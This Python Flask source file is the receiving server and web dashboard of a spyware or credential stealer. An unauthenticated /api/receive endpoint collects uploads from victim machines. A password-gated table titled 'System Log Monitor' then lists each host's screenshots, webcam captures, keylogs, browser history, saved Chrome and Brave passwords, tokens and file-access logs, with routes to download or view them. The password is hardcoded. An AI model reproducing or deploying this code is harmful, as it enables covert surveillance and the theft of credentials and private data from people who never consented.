import os
from flask import Flask, request, send_from_directory, render_template_string
from werkzeug.utils import secure_filename
from datetime import datetime
import pytz

UPLOAD_ROOT = "logs"
PASSWORD = "disha456"

app = Flask(__name__)
os.makedirs(UPLOAD_ROOT, exist_ok=True)

COLUMNS = [
    "Hostname", "Timestamp", "Desktop Screenshot", "Webcam", "Keylogs",
    "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
    "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
]

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
  <title>System Log Monitor</title>
  <style>
    body { background-color: black; color: lime; font-family: monospace; }
    h2 { color: cyan; }
    table { border-collapse: collapse; width: 100%; margin-top: 20px; }
    th, td { border: 1px solid lime; padding: 8px; text-align: center; }
    th { font-size: 18px; font-weight: bold; background: #222; }
    td a { color: cyan; text-decoration: none; }
    form { margin-top: 30px; }
    input[type=password] { background: black; color: lime; border: 1px solid lime; padding: 5px; }
  </style>
</head>
<body>
  {% if not authed %}
    <h2>Enter Password to Access Logs</h2>
    <form method="POST">
      <input type="password" name="password" placeholder="Enter password"/>
      <button type="submit">Login</button>
    </form>
  {% else %}
    <h2> Logs in Server</h2>
    <table>
      <tr>
        {% for col in columns %}
          <th>{{ col }}</th>
        {% endfor %}
      </tr>
      {% for folder in logs %}
        <tr>
          <td>{{ folder.hostname }}</td>
          <td>{{ folder.timestamp }}</td>
          {% for file in folder.files %}
            <td>
              {% if file %}
                {% if file.endswith("decrypted_keylogs.txt") %}
                  <a href="/view/{{ folder.foldername }}/{{ file.split('/')[-1] }}">📄 View</a>
                {% else %}
                  <a href="{{ file }}">📥 View/Download</a>
                {% endif %}
              {% else %}-{% endif %}
            </td>
          {% endfor %}
        </tr>
      {% endfor %}
    </table>
  {% endif %}
</body>
</html>
'''

@app.route("/", methods=["GET", "POST"])
def index():
    authed = False
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            authed = True
    elif request.args.get("access") == PASSWORD:
        authed = True

    log_entries = []
    if authed:
        for folder in sorted(os.listdir(UPLOAD_ROOT), reverse=True):
            full_path = os.path.join(UPLOAD_ROOT, folder)
            if os.path.isdir(full_path):
                row = {"hostname": "", "timestamp": "", "files": [], "foldername": folder}
                for col in COLUMNS[2:]:
                    match_file = next((f for f in os.listdir(full_path) if col.lower().replace(" ", "_") in f.lower()), None)
                    if match_file:
                        file_path = os.path.join(full_path, match_file)
                        if "host" in match_file.lower():
                            try:
                                with open(file_path, "r", encoding="utf-8") as f:
                                    row["hostname"] = f.read().strip().split("\n")[0]
                            except:
                                row["hostname"] = "Unknown"
                        elif "screenshot" in match_file.lower():
                            row["files"].append(f"/download/{folder}/{match_file}")
                        elif "decrypted_keylogs" in match_file.lower():
                            row["files"].append(f"/download/{folder}/{match_file}")
                        else:
                            row["files"].append(f"/download/{folder}/{match_file}")
                    else:
                        row["files"].append(None)
                try:
                    india_time = datetime.now(pytz.timezone("Asia/Kolkata")).strftime("%H:%M:%S__%d:%m:%Y")
                except:
                    india_time = "Time Error"
                row["timestamp"] = india_time
                if not row["hostname"]:
                    row["hostname"] = folder.split("_")[0]
                log_entries.append(row)

    return render_template_string(HTML_TEMPLATE, authed=authed, columns=COLUMNS, logs=log_entries)

@app.route("/api/receive", methods=["POST"])
def receive():
    folder_name = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    save_dir = os.path.join(UPLOAD_ROOT, folder_name)
    os.makedirs(save_dir, exist_ok=True)
    for f in request.files.values():
        filename = secure_filename(f.filename)
        f.save(os.path.join(save_dir, filename))
    return "Logs received"

@app.route("/download/<folder>/<filename>")
def download(folder, filename):
    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)

@app.route("/view/<folder>/<filename>")
def view_file(folder, filename):
    try:
        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
            content = f.read()
        return f"<pre style='color:lime; background:black; padding:10px; font-family:monospace;'>{content}</pre>"
    except:
        return "Error opening file."
